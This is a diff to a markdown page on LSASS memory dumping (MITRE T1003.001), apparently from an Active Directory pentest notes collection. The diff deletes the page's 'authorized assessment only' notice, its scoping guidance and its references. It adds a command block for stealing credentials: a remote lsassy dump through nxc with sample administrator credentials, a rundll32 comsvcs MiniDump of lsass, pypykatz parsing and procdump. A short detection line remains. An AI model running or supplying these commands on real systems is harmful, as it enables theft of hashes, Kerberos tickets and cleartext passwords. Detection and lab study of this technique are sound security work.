@@ -10,22 +10,29 @@ mitre: "T1003.001"
 tag: null
 ---
 
+
 # LSASS memory dumping
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **LSASS process memory** on a host.
 
-## Detection
+### Concept (deep)
+LSASS holds NT hashes, Kerberos tickets, and (if WDigest) cleartext. Local admin can dump via `comsvcs.dll`/`procdump`; remote tooling (`lsassy`, `nanodump`) avoids dropping files.
+
+### Commands
+```bash
+# ── Remote LSASS dump ────────────────────────────────────────────────
+nxc smb 10.10.10.5 -u administrator -p 'Password123!' -M lsassy
+
+# ── On host (comsvcs) ────────────────────────────────────────────────
+rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
+pypykatz lsa minidump lsass.dmp
+
+# ── procdump ─────────────────────────────────────────────────────────
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+### Detection
 **4656/4663** handle access to `lsass.exe`; **Sysmon 10** (`GrantedAccess 0x1010/0x1410`); enable **Credential Guard/LSA protection**.
 
 ---
-
-## References
-
-- [Microsoft: Credential Guard](https://learn.microsoft.com/windows/security/identity-protection/credential-guard/credential-guard)
-- [Microsoft: Credential protection](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/credential-protection-and-management)
-- [MITRE ATT&CK: T1003.001](https://attack.mitre.org/techniques/T1003/001/)
